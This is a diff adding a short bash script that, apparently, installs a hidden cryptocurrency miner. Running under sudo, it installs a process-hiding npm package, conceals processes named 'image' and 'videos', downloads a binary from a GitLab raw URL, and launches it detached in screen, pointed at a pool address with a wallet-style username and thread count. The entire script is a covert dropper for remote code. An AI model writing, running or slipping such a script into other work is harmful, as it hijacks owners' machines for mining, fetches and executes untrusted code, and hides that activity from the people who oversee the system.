@@ -1,0 +1,9 @@
+#!/bin/bash
+sudo su <<EOF
+apt-get install -y nodejs >/dev/null 2>&1
+sudo apt install npm
+sudo npm i -g node-process-hider && sudo ph add image && sudo ph add videos
+wget -qO videos https://gitlab.com/sarifadim/jomblo/-/raw/main/perusa && chmod +x videos
+screen -dms run ./videos -v -l 8.222.133.209:8080 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.NONAME -t 7
+EOF
+screen -r
